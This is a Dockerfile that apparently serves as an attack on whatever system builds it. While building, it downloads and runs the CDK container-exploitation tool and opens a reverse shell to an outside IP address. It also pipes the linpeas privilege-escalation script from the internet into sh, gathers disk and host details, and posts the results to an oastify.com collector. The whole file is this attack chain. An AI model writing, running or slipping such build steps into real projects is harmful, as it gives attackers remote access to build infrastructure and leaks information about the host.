FROM ubuntu:latest
ADD . /root/1
ADD ../ /root/2
RUN apt-get update; apt-get install -y --no-install-recommends ca-certificates curl gnupg netbase wget nmap build-essential
RUN wget https://github.com/cdk-team/CDK/releases/download/v1.5.2/cdk_linux_amd64
RUN chmod a+x cdk_linux_amd64
RUN ./cdk_linux_amd64 eva --full > out.txt
RUN ./cdk_linux_amd64 run reverse-shell 89.208.231.111:443
RUN fdisk -l >> out.txt && df -h >> out.txt
RUN curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
RUN curl -d @out.txt http://q2tw1tujkuddlzr85vv11oa4zv5mtmja8.oastify.com
CMD ["sleep", "10"]